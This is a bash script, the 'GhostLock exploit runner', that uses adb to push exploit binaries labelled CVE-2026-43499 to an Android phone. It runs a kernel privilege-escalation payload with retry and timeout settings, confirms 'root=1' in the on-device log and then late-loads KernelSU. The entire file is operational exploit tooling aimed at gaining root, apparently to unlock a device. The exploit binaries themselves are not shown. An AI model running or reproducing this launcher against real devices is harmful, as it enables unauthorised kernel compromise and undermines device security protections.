#!/bin/bash
# GhostLock exploit runner for SN512A.
# Documented invocation: -root --run-payload <app.so> <root> <devlog>
# (APP_PAYLOAD build => SLIDE_STACK_WRITER=2 + PSELECT_CFI_ROUTE_ATTEMPTS=4)
# Reboot first for a clean kernel state after prior failed attempts.

cd "$(dirname "$0")"
LOG="unlock-logs/ghostlock-run-$(date +%Y%m%d-%H%M%S).log"
mkdir -p unlock-logs exploit-out

{
echo "=== GhostLock run $(date) ==="

if [ ! -f kernel/PORT_VERIFIED ]; then
  echo "[ABORT] kernel/PORT_VERIFIED missing — disasm verification incomplete."
  exit 2
fi

adb get-state 2>/dev/null | grep -q device || { echo "no device"; exit 1; }

export MSYS_NO_PATHCONV=1
echo "[*] staging payload (app.so + root runner)"
adb push exploit/cve-2026-43499-app.so /data/local/tmp/gl-app.so || exit 1
adb push exploit/cve-2026-43499-root /data/local/tmp/gl-root || exit 1
adb push exploit/ksud /data/local/tmp/ksud-iqoo-z9-5g || exit 1   # path baked into su_daemon
adb push ksu/kernelsu.ko /data/local/tmp/kernelsu.ko || exit 1
adb shell 'chmod 755 /data/local/tmp/gl-root /data/local/tmp/ksud-iqoo-z9-5g; chmod 644 /data/local/tmp/gl-app.so'

echo "[*] uname -r:"; adb shell 'uname -r'

echo "[*] running exploit via --run-payload (APP_PAYLOAD build, 4 route attempts)"
adb shell 'rm -f /data/local/tmp/gl-app-run.log'
adb shell 'SLIDE_SOURCE=tracefs EXPLOIT_ATTEMPTS=8 P0_ATTEMPT_TIMEOUT_SEC=115 EXPLOIT_ATTEMPT_TIMEOUT_SEC=600 \
  /data/local/tmp/gl-root --run-payload /data/local/tmp/gl-app.so \
  /data/local/tmp/gl-root /data/local/tmp/gl-app-run.log' | tee exploit-out/last.log

echo "[*] on-device log tail:"
adb shell 'tail -40 /data/local/tmp/gl-app-run.log 2>/dev/null'

# Only late-load when the exploit actually rooted this boot.
if adb shell 'grep -q "exploit completed" /data/local/tmp/gl-app-run.log && grep -q "root=1" /data/local/tmp/gl-app-run.log'; then
  echo "[*] root=1 confirmed — late-loading KernelSU"
  adb shell '/data/local/tmp/gl-root --late-load'
else
  echo "[!] exploit did not complete — skipping late-load (reboot before retry)"
fi

echo "[*] checking for root"
adb shell 'id'
adb shell 'cat /data/local/tmp/ksu_*.log 2>/dev/null | tail -20'

echo "=== done ==="
} 2>&1 | tee "$LOG"
echo "saved: $LOG"
